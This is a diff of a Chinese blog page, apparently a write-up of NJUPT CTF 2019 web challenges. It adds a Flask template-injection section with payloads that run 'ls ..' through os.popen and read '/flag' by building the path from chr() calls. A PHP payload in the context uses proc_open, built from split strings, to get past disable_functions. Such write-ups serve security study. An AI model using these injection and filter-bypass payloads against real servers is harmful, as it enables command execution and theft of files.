@@ -65,7 +65,7 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574587789404.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574588638162.png">
-<meta property="og:updated_time" content="2019-11-24T12:37:55.121Z">
+<meta property="og:updated_time" content="2019-11-24T13:33:04.534Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574587789404.png">
   <link rel="canonical" href="https://li1m.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">
@@ -296,7 +296,7 @@
                 
               
 
-              <time title="Created: 2019-11-24 17:12:47 / Modified: 20:37:55" itemprop="dateCreated datePublished" datetime="2019-11-24T17:12:47+08:00">2019-11-24</time>
+              <time title="Created: 2019-11-24 17:12:47 / Modified: 21:33:04" itemprop="dateCreated datePublished" datetime="2019-11-24T17:12:47+08:00">2019-11-24</time>
             </span>
           
             
@@ -321,7 +321,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>4.4k</span>
+              <span>5k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -331,7 +331,7 @@
               
                 <span class="post-meta-item-text">Reading time &asymp;</span>
               
-              <span>4 mins.</span>
+              <span>5 mins.</span>
             </span>
           
 
@@ -401,7 +401,17 @@
 <p>本以为这样读flag就结束了，可是它竟然读不了。。。后来看到了readflag就知道是要用这个读啦，盲猜readflag的内容是cat /flag，所以想办法执行readflag就行了，返回去看disable_functions，ban了那么多函数，以为命令执行函数早被禁完了，但是最终发现没有ban proc_open函数，所以用它执行readflag命令，最终payload如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$test="../../.././readflag";%0a$z='p'.'ipe';%0a$b='proc'.'_open';%0a$c='var_d'.'ump';%0a$d='strea'.'m_get_c'.'ontents';%0a$e='proc_c'.'lose';%0a$a=array(array("$z","r"),array("$z","w"),array("$z","w"));%0a$fp = $b($test,$a,$zs);%0a$c($d($zs[1]));%0a$e($fp);&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
 
-<p>这里涉及挺多函数的，等过几天把做题经常遇到的函数总结一下。</p>
+
+
+<p>5.flask</p>
+<p>额，这是一个Flask模板注入 ，具体原因可以看这篇文章    <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">传送门</a></p>
+<p>直接上payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;&#123;<span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">'ls ..'</span>).read()&#125;&#125;	//执行命令</span><br></pre></td></tr></table></figure>
+
+<p>这里看到了flag直接cat ../flag是禁止的，于是用ascii编码绕过，最终payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)+chr(<span class="number">102</span>)+chr(<span class="number">108</span>)+chr(<span class="number">97</span>)+chr(<span class="number">103</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这些题涉及挺多知识的，等过几天有空把做题经常遇到的知识总结一下。</p>
 
     </div>
 
@@ -554,7 +564,7 @@
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">20 mins.</span>
+    <span title="Reading time total">21 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
